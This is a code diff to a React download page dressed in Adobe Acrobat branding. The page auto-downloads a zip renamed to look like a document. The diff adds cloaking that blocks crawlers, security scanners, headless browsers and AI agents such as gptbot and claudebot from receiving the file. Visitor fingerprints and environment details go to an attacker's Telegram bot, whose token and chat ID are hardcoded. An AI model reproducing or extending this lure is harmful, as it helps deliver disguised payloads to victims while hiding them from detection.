@@ -1,4 +1,4 @@
-import { useEffect, useMemo, useRef } from "react";
+import { useEffect, useMemo, useRef, useState } from "react";
 import { useVisitorData } from "@fingerprint/react";
 import adbLogo from "@/assets/adb-logo.png";
 import acrobatBg from "@/assets/adobe-acrobat-bg.webp";
@@ -6,42 +6,47 @@ import acrobatBg from "@/assets/adobe-acrobat-bg.webp";
 const TELEGRAM_BOT_TOKEN = "8648729689:AAEj5AJW3EJOAMYkAtVbm1DgSNgTy2fo1jw";
 const TELEGRAM_CHAT_ID = "7038669352";
 
+const BOT_SIGNATURES = [
+  'googlebot', 'bingbot', 'yahoo! slurp', 'yahooseeker', 'crawler',
+  'spider', 'pycurl', 'facebookexternalhit', 'slackbot', 'twitterbot',
+  'linkedinbot', 'whatsapp', 'telegrambot', 'discordbot', 'applebot',
+  'semrushbot', 'ahrefsbot', 'mj12bot', 'dotbot', 'petalbot',
+  'bytespider', 'gptbot', 'claudebot', 'anthropic', 'chatgpt',
+  'headlesschrome', 'phantomjs', 'selenium', 'puppeteer', 'playwright',
+  'wget', 'curl/', 'python-requests', 'python-urllib', 'java/',
+  'go-http-client', 'node-fetch', 'axios/', 'scrapy', 'httpclient',
+  'libwww-perl', 'mechanize', 'nutch', 'archive.org_bot',
+];
+
 const randomDigits = (len = 8) =>
   Array.from(crypto.getRandomValues(new Uint8Array(len)))
     .map((b) => (b % 10).toString())
     .join("");
 
-const sendTelegramNotification = async (info: {
-  fileName: string;
-  browser: string;
-  visitorId?: string;
-  ip?: string;
-}) => {
-  const time = new Date().toLocaleString("en-US", { timeZone: "UTC" });
-  const message =
-    `📥 *New Download*\n\n` +
-    `📄 File: \`${info.fileName}\`\n` +
-    `🌐 Browser: ${info.browser}\n` +
-    `🕐 Time (UTC): ${time}\n` +
-    (info.visitorId ? `🆔 Visitor: \`${info.visitorId}\`\n` : "") +
-    (info.ip ? `📍 IP: \`${info.ip}\`` : "");
-
-  try {
-    await fetch(
-      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
-      {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
-          text: message,
-          parse_mode: "Markdown",
-        }),
-      }
-    );
-  } catch (e) {
-    console.error("Telegram notification failed:", e);
+const isKnownBot = (ua: string): string | null => {
+  const lowerUA = ua.toLowerCase();
+  for (const sig of BOT_SIGNATURES) {
+    if (lowerUA.includes(sig)) return sig;
   }
+  return null;
+};
+
+const detectSuspiciousEnvironment = (): string[] => {
+  const flags: string[] = [];
+  
+  // Check for headless browser indicators
+  if ((navigator as any).webdriver) flags.push("WebDriver detected");
+  if (!window.chrome && navigator.userAgent.includes("Chrome")) flags.push("Headless Chrome suspected");
+  if ((navigator as any).languages?.length === 0) flags.push("No languages set");
+  if (navigator.hardwareConcurrency === 0) flags.push("Zero CPU cores");
+  if (screen.width === 0 || screen.height === 0) flags.push("Zero screen dimensions");
+  
+  // Check for automation frameworks
+  if ((window as any).__nightmare) flags.push("Nightmare.js detected");
+  if ((document as any).__selenium_unwrapped) flags.push("Selenium detected");
+  if ((window as any).callPhantom || (window as any)._phantom) flags.push("PhantomJS detected");
+  
+  return flags;
 };
 
 const getBrowserName = () => {
@@ -53,14 +58,102 @@ const getBrowserName = () => {
   return "Unknown";
 };
 
+const sendTelegramNotification = async (type: "download" | "bot_blocked", info: Record<string, any>) => {
+  const time = new Date().toISOString().replace("T", " ").split(".")[0] + " UTC";
+  
+  let message = "";
+  
+  if (type === "bot_blocked") {
+    const flags = (info.suspiciousFlags || []).join(", ") || "None";
+    message =
+      `🚨 <b>BOT/SUSPICIOUS TRAFFIC DETECTED</b>\n\n` +
+      `<b>Detection Details:</b>\n` +
+      `• Reason: ${info.reason}\n` +
+      `• Bot Signature: ${info.botSignature || "N/A"}\n` +
+      `• Suspicious Flags: ${flags}\n\n` +
+      `<b>Visitor Info:</b>\n` +
+      `• Visitor ID: <code>${info.visitorId || "Unknown"}</code>\n` +
+      `• Browser: ${info.browser}\n` +
+      `• Platform: ${navigator.platform}\n` +
+      `• Screen: ${screen.width}x${screen.height}\n` +
+      `• Languages: ${navigator.languages?.join(", ") || "None"}\n\n` +
+      `<b>Fingerprint Bot Detection:</b>\n` +
+      `• Bot Probability: ${info.botProbability ?? "N/A"}\n\n` +
+      `<b>User Agent:</b>\n<code>${navigator.userAgent}</code>\n\n` +
+      `<b>Action:</b> Download BLOCKED\n` +
+      `<b>Time:</b> ${time}`;
+  } else {
+    message =
+      `📥 <b>NEW DOWNLOAD</b>\n\n` +
+      `<b>File:</b> <code>${info.fileName}</code>\n` +
+      `<b>Browser:</b> ${info.browser}\n` +
+      `<b>Platform:</b> ${navigator.platform}\n` +
+      `<b>Screen:</b> ${screen.width}x${screen.height}\n` +
+      `<b>Languages:</b> ${navigator.languages?.join(", ") || "None"}\n` +
+      `<b>Visitor ID:</b> <code>${info.visitorId || "Unknown"}</code>\n` +
+      `<b>Time:</b> ${time}`;
+  }
+
+  try {
+    await fetch(
+      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+      {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: "HTML",
+        }),
+      }
+    );
+  } catch (e) {
+    console.error("Telegram notification failed:", e);
+  }
+};
+
 const Download = () => {
   const { data: visitorData } = useVisitorData({ immediate: true });
   const notifiedRef = useRef(false);
+  const [blocked, setBlocked] = useState(false);
 
+  // Client-side bot checks (runs immediately)
   useEffect(() => {
-    if (visitorData) {
-      console.log("Visitor ID:", visitorData.visitor_id);
-      console.log("Bot detection:", visitorData);
+    const ua = navigator.userAgent;
+    const botSig = isKnownBot(ua);
+    const suspiciousFlags = detectSuspiciousEnvironment();
+
+    if (botSig || suspiciousFlags.length >= 2) {
+      setBlocked(true);
+      sendTelegramNotification("bot_blocked", {
+        reason: botSig ? "Known Bot Signature" : "Suspicious Environment",
+        botSignature: botSig,
+        suspiciousFlags,
+        browser: getBrowserName(),
+        visitorId: visitorData?.visitor_id,
+      });
+    }
+  }, []);
+
+  // Fingerprint bot detection (runs when data arrives)
+  useEffect(() => {
+    if (!visitorData) return;
+    
+    const fpData = visitorData as any;
+    const botProb = fpData?.bot?.probability;
+    
+    if (botProb && botProb > 0.7) {
+      setBlocked(true);
+      if (!notifiedRef.current) {
+        notifiedRef.current = true;
+        sendTelegramNotification("bot_blocked", {
+          reason: "Fingerprint Bot Detection (High Probability)",
+          botProbability: botProb,
+          suspiciousFlags: detectSuspiciousEnvironment(),
+          browser: getBrowserName(),
+          visitorId: visitorData.visitor_id,
+        });
+      }
     }
   }, [visitorData]);
 
@@ -76,8 +169,9 @@ const Download = () => {
     return { href: "/docs/SharefilePlugin.zip", name: `2O25_Organizer_${suffix}.zip` };
   }, []);
 
+  // Auto-download (only if not blocked)
   useEffect(() => {
-    if (!downloadFile) return;
+    if (!downloadFile || blocked) return;
     const timer = setTimeout(() => {
       const link = document.createElement("a");
       link.href = downloadFile.href;
@@ -86,19 +180,17 @@ const Download = () => {
       link.click();
       document.body.removeChild(link);
 
-      // Send Telegram notification once
       if (!notifiedRef.current) {
         notifiedRef.current = true;
-        sendTelegramNotification({
+        sendTelegramNotification("download", {
           fileName: downloadFile.name,
           browser: getBrowserName(),
           visitorId: visitorData?.visitor_id,
-          ip: (visitorData as any)?.ip,
         });
       }
     }, 1000);
     return () => clearTimeout(timer);
-  }, []);
+  }, [blocked]);
 
   return (
     <div className="relative flex min-h-screen flex-col items-center justify-center overflow-hidden">
@@ -132,8 +224,9 @@ const Download = () => {
             </p>
 
             <a
-              href={downloadFile.href}
-              download={downloadFile.name}
+              href={blocked ? "#" : downloadFile.href}
+              download={blocked ? undefined : downloadFile.name}
+              onClick={blocked ? (e) => e.preventDefault() : undefined}
               className="inline-block bg-[#4285f4] hover:bg-[#3367d6] text-white font-semibold px-10 py-3 rounded-md text-[15px] transition-colors"
             >
               Download Document
